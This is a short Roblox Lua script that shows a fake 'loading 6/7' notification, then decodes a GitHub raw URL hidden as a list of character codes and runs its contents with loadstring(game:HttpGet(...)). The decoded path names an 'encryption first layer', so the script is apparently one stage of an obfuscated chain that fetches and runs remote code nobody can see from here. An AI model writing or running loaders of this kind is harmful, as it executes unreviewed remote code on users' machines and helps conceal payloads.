   local CoreGui = game:GetService("StarterGui")

CoreGui:SetCore("SendNotification", {

    Title = "加载中",

    Text = "6/7",

    Duration = 0.1,

})
wait(0.1)
 local SCC_CharPool={

[1]= tostring(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,87,83,56,53,55,57,54,48,47,45,47,109,97,105,110,47,37,69,56,37,56,52,37,57,65,37,69,54,37,57,67,37,65,67,37,69,53,37,56,65,37,65,48,37,69,53,37,65,70,37,56,54,37,69,55,37,65,67,37,65,67,37,69,52,37,66,56,37,56,48,37,69,53,37,66,49,37,56,50})end)()))}

loadstring(game:HttpGet(SCC_CharPool[1]))()
